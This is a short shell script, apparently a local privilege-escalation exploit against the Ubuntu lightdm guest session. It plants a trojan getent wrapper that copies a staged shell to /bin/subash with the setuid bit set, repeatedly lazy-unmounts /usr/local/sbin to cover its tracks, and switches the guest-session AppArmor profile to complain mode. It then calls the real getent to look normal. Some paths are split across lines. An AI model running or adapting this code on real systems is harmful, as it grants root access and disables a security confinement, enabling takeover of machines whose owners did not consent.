#!/bin/sh
/bin/cat << EOF > /usr/local/sbin/getent
#!/bin/bash
/bin/cp /var/tmp/shell /bin/subash >/dev/null 2>&1
/bin/chmod 4111 /bin/subash >/dev/null 2>&1
COUNTER=0
while [ \$COUNTER -lt 10 ]; do
/bin/umount -lf /usr/local/sbin/ >/dev/null 2>&1
let COUNTER=COUNTER+1
done
/bin/sed -i 's/\/usr\/lib\/lightdm\/lightdm-guest-session
{/\/usr\/lib\/lightdm\/lightdm-guest-session flags=(complain) {/g' /etc/
apparmor.d/lightdm-guest-session >/dev/null 2>&1
/sbin/apparmor_parser -r /etc/apparmor.d/lightdm-guest-session >/dev/null 2>
&1
/usr/bin/getent passwd "\$2"
EOF
/bin/chmod 755 /usr/local/sbin/getent >/dev/null 2>&1
